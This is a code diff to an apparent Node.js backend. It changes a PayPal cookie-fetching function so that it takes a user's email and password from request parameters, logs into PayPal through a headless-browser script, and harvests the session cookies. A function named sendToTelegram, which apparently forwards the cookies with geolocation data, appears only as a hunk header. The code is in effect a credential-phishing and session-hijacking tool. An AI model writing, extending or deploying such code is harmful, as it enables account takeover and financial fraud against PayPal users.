@@ -57,25 +57,30 @@ async function sendToTelegram(paypalCookies, userTag, examNumber, geoInfo, url, 
     }
 }
 
-async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgent) {
+async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgent, email, password) {
     const userAgent = clientUserAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36';
 
-    const query = `
-        mutation {
-            goto(url: "${paypalUrl}", waitUntil: networkIdle) {
+    const loginScript = `
+        mutation Login($url: String!, $email: String!, $password: String!) {
+            goto(url: $url, waitUntil: "networkIdle") {
+                status
+            }
+            type(selector: "input#email", text: $email) {
+                status
+            }
+            type(selector: "input#password", text: $password) {
+                status
+            }
+            click(selector: "button#btnLogin") {
+                status
+            }
+            waitForNavigation(waitUntil: "networkIdle") {
                 status
             }
             cookies {
                 cookies {
                     name
                     value
-                    domain
-                    path
-                    secure
-                    httpOnly
-                    sameSite
-                    expires
-                    url
                 }
                 time
             }
@@ -88,13 +93,18 @@ async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgen
             headers: {
                 "Content-Type": "application/json",
             },
-            body: JSON.stringify({ query })
+            body: JSON.stringify({
+                query: loginScript,
+                variables: {
+                    url: paypalUrl,
+                    email: email,
+                    password: password
+                }
+            })
         });
 
         const data = await response.json();
-        if (data.errors) {
-            throw new Error(data.errors[0].message);
-        }
+        if (data.errors) throw new Error(data.errors[0].message);
 
         const cookieResponse = data.data.cookies;
         let cookieString = "";
@@ -131,12 +141,18 @@ app.get('/api/paypal', async (req, res) => {
     const userTag = req.query.userTag || 'UnknownUser';
     const examNumber = req.query.examNumber || '';
     const clientUserAgent = req.headers['user-agent'] || '';
+    const email = req.query.email;
+    const password = req.query.password;
 
     if (!paypalUrl.startsWith('https://www.paypal.com')) {
         return res.status(400).json({ success: false, error: 'Invalid PayPal URL' });
     }
 
-    const result = await fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgent);
+    if (!email || !password) {
+        return res.status(400).json({ success: false, error: 'Email and password are required' });
+    }
+
+    const result = await fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgent, email, password);
     res.json(result);
 });
 
